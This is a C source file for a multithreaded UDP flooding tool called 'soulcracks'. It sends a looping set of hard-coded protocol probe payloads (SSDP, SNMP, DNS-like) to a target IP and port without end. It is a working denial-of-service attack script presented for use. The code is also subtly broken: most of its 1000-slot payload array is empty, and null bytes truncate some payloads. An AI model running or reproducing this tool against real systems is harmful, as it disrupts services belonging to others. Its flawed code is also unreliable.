#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>

#define MAX_PAYLOADS 1000 // Define the number of payloads

// Function to display usage instructions
void usage() {
    printf("Usage: ./soulcracks <ip> <port> <threads>\n");
    exit(1);
}

// Structure to hold thread data
struct thread_data {
    char *ip;
    int port;
};

// Attack function executed by each thread
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));

    // Fill server information
    server_addr.sin_family = AF_INET; // IPv4
    server_addr.sin_port = htons(data->port); // Convert to network byte order
    server_addr.sin_addr.s_addr = inet_addr(data->ip); // Convert IP to binary format

    // Payloads to be sent
   char *payloads[MAX_PAYLOADS] = {
        
       "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x02\x00\x00",
        "\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x01\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
    };

    // Send packets indefinitely
    while (1) {
        for (int i = 0; i < MAX_PAYLOADS; i++) {
            sendto(sock, payloads[i], strlen((char *)payloads[i]), 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr));
            // Optional: Add a small sleep to avoid flooding the network
            usleep(10000); // Sleep for 10 milliseconds (10,000 microseconds)
        }
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);

    pthread_t threads[num_threads];
    struct thread_data data[num_threads];

    // Create threads for the attack
    for (int i = 0; i < num_threads; i++) {
        data[i].ip = ip;
        data[i].port = port;
        if (pthread_create(&threads[i], NULL, attack, (void *)&data[i]) != 0) {
            perror("Failed to create thread");
            return 1;
        }
    }

    // Wait for all threads to complete (which won't happen in this case)
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}